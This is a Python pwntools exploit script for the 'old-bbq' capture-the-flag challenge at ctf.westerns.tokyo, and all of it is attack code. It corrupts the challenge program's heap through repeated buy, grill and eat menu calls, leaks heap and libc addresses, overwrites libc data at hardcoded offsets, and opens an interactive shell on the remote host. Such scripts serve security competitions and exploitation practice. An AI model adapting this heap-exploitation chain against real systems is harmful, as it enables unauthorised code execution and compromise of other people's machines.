#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.6"
port = 1234
host = "pwn1.chal.ctf.westerns.tokyo"
port = 21638
host = "old-bbq.chal.ctf.westerns.tokyo"
r = remote(host,port)

def buy(name,count):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(">>")
    r.sendline(name)
    r.recvuntil(">>")
    r.sendline(str(count))

def grill(name,idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(">>")
    r.sendline(name)
    r.recvuntil(">>")
    r.sendline(str(idx))


def eat(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(">>")
    r.sendline(str(idx))

magic = 0xdeadbeef11

buy("dada" ,0x21)
buy("dada1" ,0x31)

grill("dada",0)
buy(p64(magic),0xb2)

grill(p64(magic),1)
grill("dada1",2)
eat(0)
eat(2)
buy("orange2",0x21)
buy("orange",0x21)
buy("a"*0x27,0x31)
eat(0)
r.recvuntil(":")
r.sendline("2")
r.recvuntil("orange2")
r.recvuntil("* ")
heap = u64(r.recvuntil("(")[:-2].ljust(8,"\x00")) - 0x1f0
print hex(heap)
r.recvuntil(">>")
r.sendline("3")
grill("Beef",0)

buy("a"*0x10 + p64(heap+0xf0),10)
eat(0)
buy(p64(heap+0x180),0x41)
r.recvuntil(":")
r.sendline("2")
r.recvuntil("49)")
r.recvuntil("49)")
r.recvuntil("* ")
libc = u64(r.recvuntil(" (")[:-2].ljust(8,"\x00")) - 0x3c4b78
print "libc:",hex(libc)
r.recvuntil(">>")
r.sendline("dada")
r.recvuntil(">>")
r.sendline("0")

buy(p64(magic),0xb1)

buy("b"*0x8 + p64(0x31),0x51)

#grill("dada",3)
buy("c"*0x8 + p64(0x21),0x4141)
r.recvuntil(":")
r.sendline("2")
r.recvuntil(">>")
r.sendline("a"*0x28 + p64(heap+0x210))
eat(4)
buy("b"*0x10 + p64(libc + 0x3c4af8),0x41)
buy(p64(0x5441554156415741) + p64(0xfb89485355f58949) + p64(0xd5058b4838ec8348) + p64(0xe5ae2d8b480033e4),2147351035)
buy(p64(0x5441554156415741) + p64(0xfb89485355f58949) + p64(0xd5058b4838ec8348) + p64(0xe5ae2d8b480033e4),2147351035+84)
#grill("b"*0x30,3)
#eat(3)
buy("b"*0x10 + p64(libc + 0x3c56f0),0x41)
buy(p32(0x00000000fbad2086),0x13e8)
r.interactive()


